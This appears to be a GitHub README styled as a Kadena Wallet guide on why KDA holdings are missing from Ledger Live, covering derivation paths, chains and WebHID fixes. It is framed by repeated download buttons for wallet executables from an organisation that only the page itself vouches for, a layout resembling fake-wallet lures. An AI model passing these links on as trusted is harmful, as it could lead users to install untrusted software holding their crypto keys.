![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Ledger Not Showing KDA? What Kadena Wallet Users Check First</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

If you have the Kadena app installed on a Ledger and your KDA balance is nowhere to be found, the device is almost certainly fine. Kadena has never been supported inside Ledger Live, which means the balance was never going to appear there. It shows up in a wallet or tool that connects to the device.

This explains what Ledger actually supports for KDA, why the balance is invisible, and how to verify funds without risking them.

## You'll see this if

- Ledger Live shows no Kadena account and no way to add one.
- A Kadena wallet connects to your device but reports zero.
- You sent KDA to an address derived from your Ledger and cannot see it.
- You are unsure whether the Kadena app on the device is the same thing as Ledger Live support.

## The distinction that explains everything

There are two different things people call "Ledger support":

| Layer | What it is | KDA status |
| --- | --- | --- |
| The device app | Software installed on the Nano that signs Kadena transactions | Available, built by Zondax |
| The desktop/mobile interface | Ledger Live's own portfolio and send screens | No KDA support |

Kadena lives in the first row. Ledger's own support article states that Kadena accounts are not managed in Ledger Live, and that signing is done through a companion web tool over WebHID.

So an empty Ledger Live portfolio is the expected state, not a fault. The balance exists on-chain against an address derived from your device's seed, and only an interface that understands Kadena can display it.

## How to see the balance

1. **Install the Kadena app on the device** through the manager in Ledger Live, if it is not already there.
2. **Connect the device and open the Kadena app** before you start the wallet. Most connection failures happen because the app is not the foreground app.
3. **Use a wallet or the companion transfer tool over WebHID.** The browser will ask for permission to talk to the device; that prompt is the connection.
4. **Derive the account and compare the address.** The standard path is `44'/626'/{account}'/0/0`; the legacy Chainweaver-compatible path is `44'/626'/0'/0/{index}`. Which one your funds are under depends on how the account was first created.
5. **Check the chain selector.** Balances are per chain, and the account exists on each chain separately.
6. **Confirm in an explorer.** Paste the address into a community explorer to separate a display problem from an actual empty account.

If the address in step 4 does not match the one you funded, you are on the wrong path. Try the other one before assuming anything is lost.

## Why an address can look right and still be empty

Three separate things have to line up: the device seed, the derivation path, and the chain.

- **Seed** - fixed by the device. Your twenty-four words produce the same keys every time.
- **Path** - chosen by the interface. This is where mismatches happen, particularly for accounts that predate the Ledger app or were imported from Chainweaver.
- **Chain** - chosen by you, in the wallet. An account with KDA on chain 0 shows zero when the wallet is set to chain 1.

If in doubt, the address is the arbiter. An address either matches the one you funded or it does not, and no amount of refreshing changes that.

## Sending from a Ledger-backed account

- **Send only to `k:` addresses.** Ledger's guidance for Kadena is explicit about this, and a bare 64-character string can be interpreted as a legacy account rather than the `k:` principal you meant.
- **Confirm the destination on the device screen,** not only on the computer. The device display is the trustworthy one.
- **Expect a WebHID permission prompt** each session, and do not approve it for a site you do not recognise.
- **Do not disable browser security features** to make a connection work. If WebHID is blocked, fix the browser setting or use a different browser; turning off protections is how people get drained.

## If the wallet cannot see the device

1. Close Ledger Live. Two applications competing for the device is the most common cause of a silent failure.
2. Open the Kadena app on the device and leave it open.
3. Reconnect the cable directly, without a hub.
4. Reload the wallet page, then retry the connection.
5. Try a second browser, since WebHID support and permissions differ.
6. Update the device firmware and the Kadena app, then retry.

If the device is recognised but the account is empty on both paths and every chain, the funds are not under that seed. That is worth knowing precisely, because it redirects the search to another phrase rather than to the hardware.

## Ledger and the post-2025 landscape

Nothing about the Ledger integration changed when the company behind Kadena wound down. The device app still signs, the companion tool still mediates, and the accounts are unchanged.

What did change is the network behind the tooling: the old company API host no longer answers, and the current one is the community endpoint. If a companion page fails to load balances after connecting, that is usually the endpoint, not the device. Checking the same address in a community explorer answers the question in seconds.

## Security notes specific to hardware

- **A Ledger protects the key, not the transaction.** If you sign a malicious transaction, the device will happily approve it. Read the destination and amount on the device screen.
- **Your twenty-four words are still the backup.** Hardware reduces exposure; it does not remove the need for an offline copy.
- **Never enter the words into anything except a hardware wallet's own recovery flow.** No web tool needs them, including tools that claim to check Ledger balances.
- **Buy from the manufacturer or an authorised reseller,** and set the device up yourself so the seed is generated on the device.

## FAQ

**Why is KDA not in Ledger Live?**
Because Ledger Live does not implement Kadena account management. Signing support exists at device level; portfolio support does not.

**Can I still use my Ledger for KDA in 2026?**
Yes. The app is available through the manager and signing works with a compatible interface over WebHID.

**Which derivation path should I use?**
The standard path for new accounts, the legacy path for accounts first created in Chainweaver. Compare derived addresses to your funded address to decide.

**Does the device need to be connected to receive?**
No. Receiving only needs the address, which the wallet can derive without the device unlocked in most flows.

**What if the app is unavailable in the manager?**
Update the firmware and the manager, and check Ledger's own support page for the current app listing before assuming the app was withdrawn.

## Related reading

- Importing a Chainweaver seed into Kadena Wallet
- How to create a KDA account in Kadena Wallet
- Cross-chain transfers in Kadena Wallet
- Migrating from Koala Wallet after KDA removal

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Kadena Wallet Security: A Threat Model You Can Act On](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-security-best-practices.md)
- [KDA Recovery Scams: How to Spot Them in Kadena Wallet Support](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/avoid-kadena-recovery-scams.md)
- [Running a Kadena Account From a Phone: What Actually Works](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-mobile-app-availability.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
